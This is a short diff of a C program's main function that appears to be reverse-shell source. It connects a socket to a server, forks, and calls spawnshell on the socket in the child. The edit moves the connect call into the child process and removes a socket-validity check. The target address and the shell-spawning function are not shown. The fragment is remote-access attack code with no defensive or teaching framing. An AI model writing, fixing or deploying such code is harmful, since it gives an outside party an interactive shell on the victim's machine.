@@ -35,19 +35,15 @@ int main(int argc, char *argv[])
         {
             exit(1);
         }
-        int rc = connect(sock, (struct sockaddr *)&server, sizeof server);
 
         if (fork() == 0)
         {
+            int rc = connect(sock, (struct sockaddr *)&server, sizeof server);
             if (rc < 0)
             {
                 exit(2);
             }
 
-            if (sock < 0)
-            {
-                exit(3);
-            }
             spawnshell(sock);
             exit(0);
         }
